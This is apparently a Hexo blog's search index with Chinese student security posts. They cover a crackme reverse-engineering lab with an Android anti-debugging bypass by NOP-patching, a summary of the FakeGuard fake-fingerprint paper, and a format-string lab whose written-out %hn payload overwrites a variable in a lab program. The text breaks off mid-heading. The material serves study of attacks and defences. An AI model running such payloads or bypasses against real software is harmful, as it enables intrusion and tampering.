<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/05/24/hello-world/"/>
      <url>/2023/05/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向实验</title>
      <link href="/2023/05/22/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C/"/>
      <url>/2023/05/22/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ol><li>首先用快捷键shift+F12打开strings window，然后根据程序提示搜索Please input字样，如图所示</li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322185149255.webp" alt="image-20230322185149255"></p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322185224995.webp" alt="image-20230322185224995" style="zoom:67%;" /><ol start="2"><li><p>点击进入所在函数，认为其所在函数为main函数，将函数名rename为main函数</p></li><li><p>在此处为判断字符串长度，可以判断长度应为[11,30],  loc_4A1A1A地址处认为是判断字符串不符合要求后的出错处理程序。</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322190241456.webp" alt="image-20230322190241456" style="zoom:67%;" /></li><li><p>如图为判断第八个字符是否是A，并且字符串存储在变量5F3088中</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322190749988.webp" alt="image-20230322190749988"></p></li><li><p>之后将第八个字符改为#，然后和0x2E异或</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322191020965.webp" alt="image-20230322191020965" style="zoom:67%;" /></li><li><p>找5F3088的相关引用，一个一个查看分析后发现第二个最相关</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322191929474.webp" alt="image-20230322191929474" style="zoom:50%;" /><p>转成c语言伪代码后，发现将a1，也就是字符串的起始地址开始，将其和0x2D异或，然后和5F3088比较，返回ok从而可以判断字符串加密比较逻辑在这里</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322191631920.webp" alt="image-20230322191631920"></p></li><li><p>但是a1代表的字符串是什么呢？需要查看谁调用了该函数，一步一步往回走找到信息，最后发现为</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322192730129.webp" alt="image-20230322192730129"></p></li></ol><p>查看该字符串为</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322193746648.webp" alt="image-20230322193746648" style="zoom:67%;" /><ol start="8"><li><p>利用脚本获得flag</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322194022630.webp" alt="image-20230322194022630" style="zoom: 50%;" /></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230322194038151.webp" alt="image-20230322194038151"></p><h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h3><p>将android_server通过adb push进模拟器，并通过chmod 777赋予可执行权限</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412184735672.webp" alt="image-20230412184735672" style="zoom:50%;" /><p>在模拟器启动程序，adb附加进程调试</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412190451177.webp" alt="image-20230412190451177" style="zoom: 67%;" /><p>F9运行，发现程序直接退出</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412191006735.webp" alt="image-20230412191006735" style="zoom: 44%;" /><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412191026747.webp" alt="image-20230412191026747"></p><p>通过分析发现可能是启用了反调试机制，发现程序在调试时进入调用abort函数流程异常终止</p><h3 id="分析libcrackme-so文件"><a href="#分析libcrackme-so文件" class="headerlink" title="分析libcrackme.so文件"></a>分析libcrackme.so文件</h3><p>JNI_Onload函数是so文件的初始函数，在此设下断点，程序可以执行到这里来，此时反调试逻辑还未运行</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415143241731.webp" alt="image-20230415143241731"></p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415145900085.webp" alt="image-20230415145900085"></p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412194405195.webp" alt="image-20230412194405195" style="zoom: 50%;" /><p>如下图所示通过ida调试器将程序停在了jni_OnLoad函数里面，若想跳过反调试功能，令创建线程的函数失效，则可以将BLX R7指令改为NOP，可以通过KeyPatch插件完成。</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415135054112.webp" alt="image-20230415135054112"></p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415135141925.webp" alt="image-20230415135141925"></p><p>如下图所示，已经将该指令改为NOP空指令</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415135235106.webp" alt="image-20230415135235106"></p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415140100664.webp" alt="image-20230415140100664"></p><p>绕过反调试后，如图所示在securityCheck里面下断点，便可以在动态调试的时候看到字符串答案，输入后获得You Win的提示，破解成功。</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415145437470.webp" alt="image-20230415145437470"></p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415144714160.webp" alt="image-20230415144714160"></p>]]></content>
      
      
      <categories>
          
          <category> learn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learn </tag>
            
            <tag> HUST_lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>触觉反应</title>
      <link href="/2023/05/22/%E8%A7%A6%E8%A7%89%E5%8F%8D%E5%BA%94/"/>
      <url>/2023/05/22/%E8%A7%A6%E8%A7%89%E5%8F%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="FakeGuard-研究触觉响应，增强反指纹欺骗"><a href="#FakeGuard-研究触觉响应，增强反指纹欺骗" class="headerlink" title="FakeGuard:研究触觉响应，增强反指纹欺骗"></a>FakeGuard:研究触觉响应，增强反指纹欺骗</h1><h2 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h2><h3 id="指纹认证方式兴起，传统反欺骗方案存在漏洞"><a href="#指纹认证方式兴起，传统反欺骗方案存在漏洞" class="headerlink" title="指纹认证方式兴起，传统反欺骗方案存在漏洞"></a>指纹认证方式兴起，传统反欺骗方案存在漏洞</h3><p>指纹在保护用户信息方面起到了巨大的作用，在人们的日常的生活中，指纹常常作为代替口令的存在来进行用户身份认证。自动指纹识别系统(AFRS)旨在通过链接用户独特的指纹来保护未经授权的访问，以保护信息。随着AFRS在门禁、执法、身份管理和移动认证等关键应用中的不断发展，对手发现了绕过基于指纹安全的创新方法。</p><p>在证明有可能利用德国部长指纹的二维图像入侵以及绕过苹果的TouchID传感器之前，AFRS的漏洞并没有被认为是一个主要的威胁。从那时起，不同的攻击已经浮出水面，例如，使用3D人造假手指绕过三星S10智能手机，或通过胶枪克隆指纹来入侵500个银行账户。</p><p>在意识到以上这些威胁后，研究人员提出了有功效的对抗策略，使用定制的硬件或基于软件的解决方案。这些反欺骗解决方案被积极整合到商业AFRS产品中，以追踪毫米级的假手指。鉴于指纹领域的成熟度，现有的自动指纹识别系统被认为对非自动的、由错误引起的假手指有足够的容错率；然而，它们对新出现的攻击的有效性仍未确定。</p><h3 id="该团队的测试"><a href="#该团队的测试" class="headerlink" title="该团队的测试"></a>该团队的测试</h3><p>最新的自动指纹识别系统对假手指是否有抵抗力？为了回答这个问题，该团队通过高精度的假手指攻击，对AFRS的反欺骗机制进行了探索性调查。</p><p><strong>攻击者假设：</strong></p><ol><li><p>非侵入性:由于Bob的警惕，Alice不能直接或无线访问AFRS的固件模块。(AFRS:在智能设备中，在硬件和软件的开发过程中集成了多种安全检查，通过防篡改包装或在加密电路上安装AFRS进行恶意入侵检测.)</p></li><li><p>高精度生物特征。敌手可以获取指纹的高精度信息。如通过社交媒体、光学相机等</p></li><li><p>制造能力:Alice不需要使用昂贵的制造机器。尽管Alice能够用各种各样的欺骗材料制作假手指，但她不擅长通过仿生3D打印机制作害者活手指的生物复制品，因为这些机器在普通攻击实践中经济上是不可行的。</p></li></ol><p><strong>攻击要求：</strong></p><ul><li>相似性：Alice将在访问尝试中以与Bob相同的动态(即压力和速度)输入假手指。</li><li>隐藏性:安全漏洞发生后，智能设备上不应留有指向攻击者的痕迹。（油腻或粘性的物质可能会在设备上留下痕迹，这在物质分析中很容易识别。)</li><li>模型精度:Alice会防止输入的假手指有任何容易被AFRS识别的缺陷。</li></ul><p><strong>采用的假手指的特征</strong>：</p><ul><li><p>假手指材料需要具有与人类皮肤相同的质感和阻抗。基于以上要求，聚醋酸乙烯酯(PVAc)胶，是攻击模型最适合的材料。</p><p>聚醋酸乙烯酯胶的主要成分是聚醋酸乙烯酯，一种脂肪族橡胶合成聚合物，分子式为$(C_4H_6O_2)_n$。</p><p>物理性质：PVAc胶作为一种大分子物质，其粒径在100nm ~ 1$\mu m$之间。在25℃处其密度为1.191 g&#x2F;mL，介电常数为1.15。PVAc胶在正常环境下具有弹性和稳定性。如图为假手指内的化学结构。</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230415101335133.webp" alt="image-20230415101335133"></p></li><li><p>没有使用昂贵的3D打印机，其可以利用低成本和非常容易获取的材料来制造高分辨率假手指来进行攻击，指纹纹理和整个手指几何形状的误差幅度为亚微米级。这些假手指拥有与合法用户的真实手指几乎相同的纹理和阻抗信息。并且假手指上的指纹纹理具有卓越的脊清晰度和强度，有助于突破光学扫描仪的反欺骗功能。</p></li></ul><p>假手指攻击揭示了最新识别系统全性的不足，并能以超过93%的成功欺骗率攻破不同类型的具有防欺骗功能AFRS。鉴于自动指纹识别系统市场预计在2024年将增长到71亿，需要立即采取对策，以克服活体和假体手指在纹理和阻抗水平上的相似性。</p><p><strong>攻击成功原因分析：</strong>现有的三维表面或纹理匹配算法主要利用脊强度和清晰度信息，因此无法区分我们的部分假指纹和部分活手指。PVAc胶和人体皮肤之间的阻抗相似性使得假手指能够像活体手指一样刺激电容分布。因此，假指纹也可以欺骗智能手机和笔记本电脑设备中的电容性AFRS。</p><h2 id="新方法介绍"><a href="#新方法介绍" class="headerlink" title="新方法介绍"></a>新方法介绍</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>众所周知，人类指尖不仅包含独特的指纹纹理，而且包含血管、皮肤(如表皮、真皮)、指骨和组织的复杂多层解剖结构。这些生物元素之间的动态互联性决定了不同的物理指标，包括触摸交互过程中指尖的硬度和弹性。除了指纹细节外，为了捕捉这些物理测量的内在表征，该团队提出了一种具有成本效益和硬件友好的触觉界面，可以与现成的AFRS无缝集成。一种专门的聚二甲基硅氧烷(PDMS)层促进了与用户指尖交互时的触觉反应，而响应的大小取决于交互表面的构成。</p><h4 id="PDMS的特性"><a href="#PDMS的特性" class="headerlink" title="PDMS的特性"></a>PDMS的特性</h4><p>触觉传感器最好选用具有粘弹性和弱分子间作力的聚合物以作为测量相互作用介质的物理特性。</p><p>聚二甲基硅氧烷(PDMS)是一种广泛应用的硅基有机聚合物，具有无毒、生物相容性、弹性、透明和耐用性等多种特点。</p><p>当人的指尖压在弹性体表面(如PDMS)时，聚合物结构会发生变形。这种变形由弹性静力学偏微分方程系统控制<br>$$<br>\bigtriangledown \times \sigma +F&#x3D;0<br>$$</p><p>$$<br>\varepsilon &#x3D;\frac 1 2 [\bigtriangledown u+(\bigtriangledown u)^T]<br>$$</p><p>$$<br>\sigma &#x3D; C:\varepsilon<br>$$</p><p>多层指尖的F、$\varepsilon$、C与单层假手指的F、$\varepsilon$、C不同，从而形成独特的形变u。</p><p>这种形变即体现为触觉响应效应，其大小与整个指尖的解剖结构相关。</p><p>而指尖的多层组成导致了非线性的触觉反应;单层物体(如假手指)在接触区域引起均匀分布的触觉反应。</p><h3 id="系统框架"><a href="#系统框架" class="headerlink" title="系统框架"></a>系统框架</h3><p>总体系统涉及硬件和软件模块的结合。</p><ol><li><p>硬件模块:指尖被压在PDMS凝胶上，该凝胶受到不同方向的光学照明。触觉反应由智能手机摄像头记录在一系列图像中。放置丙烯酸反射膜以阻断环境光。</p><p>其中包括：</p><ul><li><p>低成本led:三点led位于传感器的内壳上，从不同的照明方向照亮PDMS凝胶。每个LED的功耗为0.024W。白色LED圆形环确保了从各个角度看都均匀明亮的表面。</p></li><li><p>智能手机相机:我们考虑一种低成本和便携的智能手机相机(96dpi，每秒3帧)来捕捉图像序列中的触觉反应。摄像机放置在距凝胶表面10cm焦距处，以获取详细的响应。</p></li><li><p>树莓派:用于控制led的亮度和相机参数（由带有ARM的树莓派4微控制器控制）</p></li><li><p>外壳:采用高12cm、直径8cm的圆柱形结构建模。使用3D打印机制作由光敏树脂组成的外壳。</p></li></ul></li><li><p>软件模块：将测量的图像序列输入到光度立体算法中，用于触觉响应的三维重建。采用旋转不变的局部二值模式(Rot-LBP)和灰度共生矩阵(GLCM)来表示3D响应，同时利用指纹检索模型来捕获固有的方向和脊频率信息。将所选特征输入到分类模型中进行假手指检测。</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230422101242527.webp" alt="image-20230422101242527"></p></li></ol><p>下图所示为硬件模块的实拍图</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230411164815235.webp" alt="image-20230411164815235"></p><p>在硬件模块中，采用了双层PDMS凝胶作为相互作用介质。透明层由184PDMS组成，聚合物与交联剂的混合比例为35:1。527PDMS采用1:1比例，形成具有足够弹性的理想彩色层，可捕获指纹纹路和图案。彩色层的作用是防止环境光到达相机镜头，还克服了对用户的肤色很敏感的问题，因为较暗的色调可以减少感知图像中的指纹信息。同时为了防止镜面反射对凝胶表面的影响，在PDMS和相机镜头之间放置了一层丙烯酸反射膜。</p><h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><ol><li>在感知过程中，合法用户将指尖按在PDMS凝胶上超过1秒;每个点的LED灯都被打开和关闭(一次一个)，同时由相机记录凝胶表面的图像。</li><li>利用光度立体技术从一系列捕获的图像中重建三维触觉反应，同时确保解剖学和指纹模式的内在信息。三维响应重建的过程包括确定光的方向、表面法线和深度信息。（光度立体算法是一种对同一物体的二维图像在不同光照条件下估计深度和表面方向的三维重建解决方案。）</li><li>进行触觉空间分布</li><li>最后利用重构出来的图像辨别是否是假指纹</li></ol><h3 id="处理触觉响应过程"><a href="#处理触觉响应过程" class="headerlink" title="处理触觉响应过程"></a>处理触觉响应过程</h3><p>当指尖被压在PDMS凝胶上时，产生的触觉反应与指尖的解剖结构相关，并在三个维度上扩散。通过从触觉响应中提取多级细节特征来展示 FakeGuard 与 AFRS 的软件兼容性。然后，我们提取触觉响应中的空间特征，这些特征与用户指尖引起的PDMS凝胶变形有关。</p><h4 id="提取细节特征"><a href="#提取细节特征" class="headerlink" title="提取细节特征"></a>提取细节特征</h4><ol><li><p><strong>重构</strong></p><p>采用光度立体法对图像进行重构<br>$$<br>\left{ \begin{aligned} E_1(x,y)&#x3D;\frac {Q(1+pp_1+qq_1)}{\sqrt{1+p^2+q^2}\sqrt{1+p^2 _1+q^2 _1}} \ E_2(x,y)&#x3D;\frac {Q(1+pp_2+qq_2)}{\sqrt{1+p^2+q^2}\sqrt{1+p^2 _2+q^2 _2}} \ E_3(x,y)&#x3D;\frac {Q(1+pp_3+qq_3)}{\sqrt{1+p^2+q^2}\sqrt{1+p^2 _3+q^2 _3}} \end{aligned} \right.<br>$$</p><p>$$<br>p&#x3D;\frac{\partial z(x,y)}{\partial x}&#x3D;z(x+1,y)-z(x,y)<br>$$</p><p>$$<br>q&#x3D;\frac{\partial z(x,y)}{\partial y}&#x3D;z(x,y+1)-z(x,y)<br>$$</p><p>其中E1、E2、E3分别为三幅图像像素点的规格化亮度，(p1,q1)(p2,q2)(p3,q3)分别为三束光线的矢量，Q为反射常数，(p,q)为表面的方向梯度</p><p>通过对方程组求解得到图像上各象素点的表面方向梯度 , 在实际情况中由于图像已离散化因此可以由他们的一次差分近似地表示。设起始点为(x0,y0)，通常为图像的中心点。便可由上式求得其相邻四个点的高度值，分别表示为Z(x+1,y)、Z(x-1,y)、Z(x,y-1)、Z(x,y+1)。并且可以进一步扩散到整体图像，并恢复出物体表面的形状</p><p>下图所示为恢复出的指纹形状</p></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230411170450287.webp" alt="image-20230411170450287"></p><ol start="2"><li><p><strong>增强</strong></p><p>指纹由交错的山脊和山谷图案组成，它们可以分叉、终止或相互平行。该团队提出了一种融合了一级特征(即局部方向和脊频图)和二级特征(即细节位置和角度)的指纹检索方法。</p><p>首先通过自适应阈值化、归一化等方法对光度立体图像进行了增强。图像的二值化或阈值化旨在提取图像中的目标物体，将背景以及噪声区分开来。通常会设定一个阈值T，通过T将图像的像素划分为两类：大于T的像素群和小于T的像素群。每个像素都只有一个灰度值，其大小表示明暗程度。二值化处理可以将图像中的像素划分为两类颜色。</p><p>自适应体现在每个像素位置处的二值化阈值不是固定不变的，而是由其周围邻域像素的分布来决定的。</p><p>下图为处理后的图像</p></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230411170614876.webp" alt="image-20230411170614876"></p><ol start="3"><li><p><strong>取向</strong></p><p>在增强的指纹图像中找到轮廓来构建图形结构的边缘，如下图所示。</p></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412100518832.webp" alt="image-20230412100518832"></p><ol start="4"><li><p><strong>求脊频率</strong></p><p>在计算方向图后，可以推导相同位置的脊型和谷型的频率。对于每个大小为32x32的块，脊频是相邻区域平均脊线周期的倒数。下图显示了脊频图，其中较轻的块表示较高的频率。</p></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412101533178.webp" alt="image-20230412101533178"></p><ol start="5"><li><p><strong>细节</strong></p><p>由NIST提供的NBIS的MINDTCT函数进行细节提取。MINDTCT包括四个主要步骤，包括图像映射的生成、图像二值化、初始细节集的检测和去除虚假细节，以提供[x, y,$\theta$]形式的特征集。(x,y)为位置，$\theta$为角，如下图所示。</p></li></ol><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412101741159.webp" alt="image-20230412101741159"></p><h4 id="触觉空间分布"><a href="#触觉空间分布" class="headerlink" title="触觉空间分布"></a>触觉空间分布</h4><p>触觉响应是三维的，也就是说，它在给定的水平和垂直位置有特定的深度。深度信息通过像素强度反映在灰度图像中，而触觉响应可以包含在整体空间纹理分布中。该团队采用旋转不变的局部二进制模式(Rot-LBP)和灰度共生矩阵(GLCM)来分析这种空间分布。</p><ul><li><p><strong>Rot-LBP</strong></p><p>局部二值模式是一种灰度范围内的纹理描述方式。算法的思想是利用结构化思想提取窗口特征，再利用统计化做最终整体特征的提取。</p><p>1、对图像中的所有点，以该点为中心，取3x3的邻域窗口；</p><p>2、将8-邻域像素值与中心点像素值进行比较，大于或等于中心像素标记为1，否则标记为0；</p><p>3、将周围0-1序列，以一定的顺序排列，成一个8位的无符号的二进制数，转化成整数；</p><p>4、这个整数就是表征这个窗口的LBP值</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412102829248.webp" alt="image-20230412102829248"></p><p>但是我们注意到，当这个01序列以另外一种方式取值时，LBP的值就会发生改变。所以需要采用一定方法使其具有旋转不变性以增强其鲁棒性。具体方法为不断  旋转邻域得到一系列的LBP值，取其中最小值作为该邻域的LBP值。旋转过程实质上就是对二进制模式进行循环移位的过程。</p></li></ul><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230412103012544.webp" alt="image-20230412103012544"></p><ul><li><p><strong>GLCM</strong></p><p>该方法量化了凝胶表面的难以察觉的变化。</p><p>Rot-LBP模式中各灰度对(i,j)的共现概率可定义为:<br>$$<br>p(i,j)&#x3D;\frac{C(i,j)}{\sum _{i&#x3D;0}^{N-1}\sum _{j&#x3D;0}^{N-1}C(i,j)}<br>$$</p><p>矩阵的水平和垂直均值如下：</p></li></ul><p>$$<br>  u_x&#x3D;\sum _{i&#x3D;0}^{N-1}\sum _{j&#x3D;0}^{N-1}i\times p(i,j),u_y&#x3D;\sum _{i&#x3D;0}^{N-1}\sum _{j&#x3D;0}^{N-1}j\times p(i,j)<br>$$</p><p>  其中C(i,j)是灰度i和j在窗口N &#x3D; 32内的出现次数。</p><p>  分别在0、45、90、135°方向上计算GLCM，可以抽象出基于触觉的特征。相关的信息度量可以分为一阶统计(单个像素属性)和二阶统计(相对像素属性)。</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><h3 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h3><p>要求每个受试者进行15次试验。在每次试验中，参与者首先在PDMS凝胶上按下他们的活手指。这个过程在一次试验中重复20次。每次试验间隔10分钟，以确保受试者的按压动作更自然，更接近真实场景(即非均匀按压)。对于每一个按压动作，通过智能手机摄像头获得一秒钟的记录。单个记录显示一个3D图像，其中包含特定特征的触觉反应。因此，对于活体手指，总共记录了6000张3D图像(20名受试者* 300个按压动作)和18000张2D图像(20名受试者* 300个按压动作* 3个样本&#x2F;动作)。对于针对每个受试者制作的假手指(能够欺骗AFRS)，以相同的方式重复该实验，以生成总共12000个3D图像。</p><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>FakeGuard作为影响应用程序的安全非常重要的机制，在实际条件下检查性能和可靠性至关重要。该团队考虑了两种情况：</p><ol><li>监督检测：给定两个类别的训练样本对活手指和假手指进行分类;</li><li>无监督呈现攻击：当模型仅在活手指样本上训练时，探究是否能够识别未知假手指</li></ol><p><strong>监督检测：</strong>在监督场景中，分类器在多个用户上进行训练，并用于识别特定的目标。该团队对12000个样本(6000个活样本和6000个假样本)执行10倍交叉验证，FakeGuard在不同的分类器(即SVM, KNN, LDA, LR, XGBoost, LightGBM和CNN)中使用来自活手指和假手指的样本进行训练。下图所示为识别错误率。</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230420121551091.webp" alt="image-20230420121551091" style="zoom:67%;" /><p>由图中可知，SVM、KNN、LDA、LR、XGBoost、LightGBM和CNN检测活指和假指的平均误差分别为3.925%、8.2%、1.725%、2.175%、2.009%、1.777%和1.815%，在区分假指纹和真实指纹样本方面表现出了很好的性能。研究结果表明，FakeGuard在假手指检测方面的潜力超过了现有的反欺骗解决方案。</p><p><strong>无监督呈现攻击：</strong>在现实世界的应用中，生物识别系统学会了区分用户的活体指纹，但对对手在攻击中可能利用的假手指（如手指材料）一无所知。理想的自动指纹识别系统应该能够拒绝假手指，而无需事先训练。然而，现有的研究需要事先对已知的假手指样本进行反欺骗模型的训练。该团队探究了只训练活体手指时，是否能识别出未知的假手指。</p><p>下图所示为当底层分类器只对真实的手指进行训练时，FakeGuard可以拒绝未知的假手指(红线表示的理想性能)。尽管只有触觉反应功能的训练，来自未知&#x2F;未经授权用户的活手指&#x2F;假手指仍然可以被拒绝。根据阈值的不同，平均欺诈率在4.67% ~ 2.43%之间。证明了即使没有广泛的学习过程，触觉反应也是一种很有前途的抗欺骗特征，它能识别出在真实手指和假手指之间存在的显著差异。</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230420123009414.webp" alt="image-20230420123009414" style="zoom:67%;" /><p>同时该团队还探究了触觉反应特征的LDA二维表示，以演示在各种用于制作假手指的欺骗材料中真实和假指纹之间的可识别性。特征1和特征2表示降维后的两个维度。可以看到在活体手指和用各种材料制作的假手指之间有一条明显的区分线。</p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230420123704081.webp" alt="image-20230420123704081" style="zoom:67%;" /><h2 id="总结与思考"><a href="#总结与思考" class="headerlink" title="总结与思考"></a>总结与思考</h2><p>大量关于指纹反欺骗的文献和AFRS的发展让人们高估了对假手指的检测能力，是一种错误的安全感。在这篇论文中，该团队首先证明了目前最先进的AFRS可以被高精度的假手指欺骗。所以他们思考了材料与活体的最本质区别，考虑并研究了了解剖的生物学特性，并发现利用这种特性可以更好地区分活体与假手指。由此开发了FakeGuard，利用活体指尖与凝胶表面相互作用引起的触觉反应来反指纹欺骗。</p><p>FakeGuard是用户友好的，具有对抗最先进的欺骗攻击的优越性能。但是我认为因为他们采用了特殊的硬件设备，很难与现有的设备（如手机、平板电脑）集成兼容，不具备广泛应用的商业价值。其更重要的意义在于发明了一种可以更精确地识别假手指的方案，更多的具有理论上的价值，如果要达到广泛地商用，还有很长的一段路要走。</p>]]></content>
      
      
      <categories>
          
          <category> learn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learn </tag>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息系统安全实验</title>
      <link href="/2023/05/21/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8Clab1/"/>
      <url>/2023/05/21/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8Clab1/</url>
      
        <content type="html"><![CDATA[<h1 id="任务1"><a href="#任务1" class="headerlink" title="任务1"></a>任务1</h1><p>首先关闭aslr</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230516191831272-168473202105019.webp" alt="image-20230516191831272"></p><p>使用命令<code>gcc -z execstack -o prog1 prog1.c -m32</code>编译prog1.c</p><h3 id="将变量-var-的值，从-0x11223344变成-0x66887799"><a href="#将变量-var-的值，从-0x11223344变成-0x66887799" class="headerlink" title="将变量 var 的值，从 0x11223344变成 0x66887799"></a>将变量 var 的值，从 0x11223344变成 0x66887799</h3><p>如图可以看到目标地址为0xffffd048</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230516194347120-168473202105021.webp" alt="image-20230516194347120"></p><p>构造字符串，并且避免print大量字符，若将数据分为4部分来写入则每一个字节要写入的数字太小，无法利用%hhn实现太小的数字，所以分为两部分来写入，构造input字符串</p><p>0x6688 &#x3D; 26248</p><p>26248-4-4-4-40&#x3D;26196</p><p>0x7799 &#x3D; 30617</p><p>30617-26248&#x3D;4369</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">&quot;\x4A\xd0\xff\xff@@@@\x48\xd0\xff\xff&quot;</span>)%.8x%.8x%.8x%.8x%.8x%.26196x%hn%.4369x%hn&gt;input</span><br><span class="line">./prog1 &lt;input</span><br></pre></td></tr></table></figure><p>运行后可以看到地址变为了0x66887799</p><p><img src="https://ssypic-1318322293.cos.ap-nanjing.myqcloud.com/md/image-20230516200003642-168473202105023.webp" alt="image-20230516200003642"></p><h3 id="将变量-var-的值，从-0x11223344变成-0xdeadbeef"><a href="#将变量-var-的值，从-0x11223344变成-0xdeadbeef" class="headerlink" title="将变量 var 的值，从 0x11223344变成 